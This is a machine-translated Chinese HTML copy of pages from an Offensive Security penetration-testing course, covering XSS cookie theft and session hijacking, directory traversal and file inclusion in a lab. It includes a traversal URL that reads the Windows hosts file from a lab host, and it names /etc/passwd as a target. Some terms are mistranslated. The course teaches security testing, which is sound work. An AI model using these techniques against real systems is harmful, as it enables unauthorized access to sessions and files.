<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104245;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 150：Cookie 编辑器对话框窗口 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:104719;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="89"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 89 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:104752;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:105829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:105829;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:105829;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">309</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:104842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.4.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮，粘贴窃取的 cookie 值，然后单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以保存新的</font></font></nobr></div>
<div style="position:absolute;top:104882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">曲奇饼：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105176;left:379"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 151：添加 Cookie</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加 cookie 值后，我们可以浏览到 /admin.php 的管理界面</font></font></nobr></div>
<div style="position:absolute;top:105226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无需提供任何凭据：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105544;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 152：在没有凭据的情况下访问管理页面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们不会被重定向到登录页面，我们在反馈旁边有“删除”链接</font></font></nobr></div>
<div style="position:absolute;top:105594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">项目。</font><font style="vertical-align: inherit;">这表明我们已经成功劫持了管理用户的会话。</font><font style="vertical-align: inherit;">笔记</font></font></nobr></div>
<div style="position:absolute;top:105614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种攻击是特定于会话的。</font><font style="vertical-align: inherit;">一旦我们窃取了会话，我们就可以伪装成受害者</font></font></nobr></div>
<div style="position:absolute;top:105633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直到他们注销或他们的会话过期。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105667;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.5 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、利用示例应用中的XSS漏洞获取admin cookie并劫持</font></font></nobr></div>
<div style="position:absolute;top:105716;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议。</font><font style="vertical-align: inherit;">请记住在您的 Windows 10 实验室机器上使用 PowerShell 脚本</font></font></nobr></div>
<div style="position:absolute;top:105736;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模拟管理员登录。</font></font></nobr></div>
<div style="position:absolute;top:105764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 考虑该应用程序中的 XSS 漏洞还有哪些可能被用于攻击的方式。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:105907;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="90"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 90 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:105940;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:107017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:107017;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:107017;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">310</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 此漏洞是否攻击站点的服务器或客户端？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106070;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.6 其他 XSS 攻击向量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前几节说明了一些基本的 XSS 攻击示例。</font><font style="vertical-align: inherit;">如果 Web 应用程序</font></font></nobr></div>
<div style="position:absolute;top:106124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在显示之前不过滤任何用户输入，我们可以使用全系列的 JavaScript，</font></font></nobr></div>
<div style="position:absolute;top:106143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅受我们可以注入的代码长度的限制。</font><font style="vertical-align: inherit;">即使有效载荷大小有限，也有可能</font></font></nobr></div>
<div style="position:absolute;top:106163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 XSS 将链接注入到外部 JavaScript 文件，绕过大小限制。</font></font></nobr></div>
<div style="position:absolute;top:106196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XSS 的潜在影响不仅限于窃取 cookie。</font><font style="vertical-align: inherit;">我们已经提到重定向</font></font></nobr></div>
<div style="position:absolute;top:106215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和客户端攻击。</font><font style="vertical-align: inherit;">XSS 负载的其他示例包括击键记录器、网络钓鱼</font></font></nobr></div>
<div style="position:absolute;top:106234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击、端口扫描和内容抓取工具/浏览器。</font><font style="vertical-align: inherit;">Kali Linux 包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeEF</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，浏览器</font></font></nobr></div>
<div style="position:absolute;top:106254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用框架，可以利用一个简单的 XSS 漏洞来启动许多不同的</font></font></nobr></div>
<div style="position:absolute;top:106273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击。</font><font style="vertical-align: inherit;">虽然我们不会在这里介绍 BeEF，但请花点时间探索它的功能</font></font></nobr></div>
<div style="position:absolute;top:106292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对您的 Windows 10 实验室机器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106327;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.3 目录遍历漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106364;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录遍历</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">274</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞，也称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径遍历</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞，允许攻击者</font></font></nobr></div>
<div style="position:absolute;top:106384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经授权访问应用程序中的文件或通常无法通过</font></font></nobr></div>
<div style="position:absolute;top:106403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 界面，例如应用程序的 Web 根目录之外的那些。</font><font style="vertical-align: inherit;">出现此漏洞</font></font></nobr></div>
<div style="position:absolute;top:106423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当输入验证不佳时，随后授予攻击者操纵文件路径的能力</font></font></nobr></div>
<div style="position:absolute;top:106442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有“../”或“..\”字符。</font></font></nobr></div>
<div style="position:absolute;top:106475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些攻击可以暴露敏感信息，但不会在应用程序上执行代码</font></font></nobr></div>
<div style="position:absolute;top:106494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font><font style="vertical-align: inherit;">在使用特定编程语言编写的某些应用程序服务器上，目录</font></font></nobr></div>
<div style="position:absolute;top:106514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遍历攻击可用于帮助促进</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件包含</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击。</font><font style="vertical-align: inherit;">虽然有一些重叠</font></font></nobr></div>
<div style="position:absolute;top:106533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于识别这两种类型漏洞的技术，它们的结果是不同的。</font></font></nobr></div>
<div style="position:absolute;top:106552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先介绍目录遍历技术，并在后面的部分中介绍文件包含漏洞。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106587;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.3.1 识别和利用目录遍历</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索目录遍历从检查 URL 查询字符串和表单主体开始</font></font></nobr></div>
<div style="position:absolute;top:106640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索显示为文件引用的值，包括最常见的指示符：文件</font></font></nobr></div>
<div style="position:absolute;top:106660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL 查询字符串中的扩展名。</font></font></nobr></div>
<div style="position:absolute;top:106692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们确定了一些可能的候选者，我们就可以修改这些值以尝试引用</font></font></nobr></div>
<div style="position:absolute;top:106712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统上的任何用户都应该可以读取的文件，例如 Linux 上的 /etc/passwd 或 c:\boot.ini</font></font></nobr></div>
<div style="position:absolute;top:106731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 上。</font></font></nobr></div>
<div style="position:absolute;top:106764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回到我们的 Windows 10 实验室机器上的示例应用程序来演示这一点</font></font></nobr></div>
<div style="position:absolute;top:106784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脆弱性。</font><font style="vertical-align: inherit;">确保在继续之前启动 Apache 和 MySQL。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:106967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">274 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Directory_traversal_attack</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:107095;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="91"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 91 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:107128;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:108205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:108205;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:108205;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">311</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:107218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从主 Web 索引页面，单击“菜单”以显示示例菜单：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107624;left:378"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 153：查找文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击“菜单”链接后，URL 会更新并包含一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的参数</font><font style="vertical-align: inherit;">和一个值</font></font></nobr></div>
<div style="position:absolute;top:107674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“current_menu.php”。</font><font style="vertical-align: inherit;">参数值的文件扩展名通常很好地表明我们</font></font></nobr></div>
<div style="position:absolute;top:107694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该进一步调查，因为它表明文本或代码来自不同的</font></font></nobr></div>
<div style="position:absolute;top:107713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源。</font><font style="vertical-align: inherit;">大多数目录遍历不是那么明显，而是相当数量的旧 PHP 应用程序</font></font></nobr></div>
<div style="position:absolute;top:107732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以类似的方式加载页面。</font></font></nobr></div>
<div style="position:absolute;top:107765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在不知道代码是什么样子的情况下，我们可以通过更改</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的值来开始研究它</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:107784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将“current_menu.php”更改为“old.php”之类的内容，我们得到一个错误而不是菜单：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108012;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 154：在应用程序中生成错误</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，错误消息表明服务器未能打开要包含的文件并返回一个</font></font></nobr></div>
<div style="position:absolute;top:108062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整的文件路径。</font><font style="vertical-align: inherit;">这表明我们可以通过以下方式控制页面中呈现的内容</font></font></nobr></div>
<div style="position:absolute;top:108082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数。</font><font style="vertical-align: inherit;">如果我们还不知道我们的目标是 Windows 主机，这</font></font></nobr></div>
<div style="position:absolute;top:108101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误消息会泄露它。</font><font style="vertical-align: inherit;">它还包括有关源目录的信息</font></font></nobr></div>
<div style="position:absolute;top:108121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font><font style="vertical-align: inherit;">在利用目录遍历时，操作系统信息至关重要。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:108283;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="92"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 92 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108316;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:109393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:109393;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:109393;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">312</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们知道应用程序在 Windows 系统上运行，让我们更新我们的有效负载到目标</font></font></nobr></div>
<div style="position:absolute;top:108431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 主机文件。</font><font style="vertical-align: inherit;">这是一个有用的文件，可用于 Windows 系统，因为它可靠且</font></font></nobr></div>
<div style="position:absolute;top:108450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何用户都可以访问。</font></font></nobr></div>
<div style="position:absolute;top:108483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们将参数值更改为 c:\windows\system32\drivers\etc\hosts 并提交 URL：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts</font></font></nobr></div>
<div style="position:absolute;top:108538;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 294 - 更新 Windows 主机文件的 URL</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的浏览器中提交此 URL 后，该页面包含主机文件的内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108855;left:261"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 155：尝试利用目录遍历漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">看来这个目录遍历漏洞允许我们读取任何类型的文件，包括</font></font></nobr></div>
<div style="position:absolute;top:108905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 根目录之外的那些。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108939;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.3.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.利用目录遍历漏洞读取Windows 10实验室中的任意文件</font></font></nobr></div>
<div style="position:absolute;top:108989;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109023;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4 文件包含漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与仅显示文件内容的目录遍历不同，文件包含</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">275 个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞</font></font></nobr></div>
<div style="position:absolute;top:109080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许攻击者将文件包含到应用程序的运行代码中。</font></font></nobr></div>
<div style="position:absolute;top:109113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了真正利用文件包含漏洞，我们不仅要能够执行代码，</font></font></nobr></div>
<div style="position:absolute;top:109133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还要在某处编写我们的 shell 负载。</font></font></nobr></div>
<div style="position:absolute;top:109165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当包含的文件从同一 Web 服务器加载时，会发生本地文件包含 (LFI)。</font><font style="vertical-align: inherit;">偏僻的</font></font></nobr></div>
<div style="position:absolute;top:109185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件包含 (RFI) 从外部源加载文件时发生。</font><font style="vertical-align: inherit;">这些漏洞是</font></font></nobr></div>
<div style="position:absolute;top:109204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常见于 PHP 应用程序中，但它们也可以出现在其他编程语言中。</font></font></nobr></div>
<div style="position:absolute;top:109237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些漏洞的利用取决于应用程序的编程语言</font></font></nobr></div>
<div style="position:absolute;top:109256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写在和服务器配置。</font><font style="vertical-align: inherit;">对于 PHP，语言运行时的版本和</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:109343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">275 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/File_inclusion_vulnerability</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:109471;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="93"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 93 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:109504;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:110581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:110581;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:110581;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">313</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 服务器配置，特别是 php.ini 值，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">register_globals</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">allow_url</font></font></i></nobr></div>
<div style="position:absolute;top:109619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包装器，在如何利用这些漏洞方面有很大的不同。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109681;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 实验室机器上的 php.ini 文件可以在以下位置找到</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109701;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\xampp\php\php.ini </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在对此文件进行任何更改之前，请考虑进行</font></font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109720;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">备份。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，目录遍历漏洞通常与 LFI 结合使用，特别是</font></font></nobr></div>
<div style="position:absolute;top:109801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定 LFI 负载中使用的文件。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109836;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.1 识别文件包含漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件包含的发现方式与目录遍历相同。</font><font style="vertical-align: inherit;">我们必须找到</font></font></nobr></div>
<div style="position:absolute;top:109890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以操纵并尝试使用它们来加载任意文件的参数。</font><font style="vertical-align: inherit;">然而，一个文件</font></font></nobr></div>
<div style="position:absolute;top:109909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含更进一步，因为我们尝试在</font></font></nobr></div>
<div style="position:absolute;top:109928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font></font></nobr></div>
<div style="position:absolute;top:109961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还应该检查这些参数，看看它们是否容易受到远程包含 (RFI) 的影响</font></font></nobr></div>
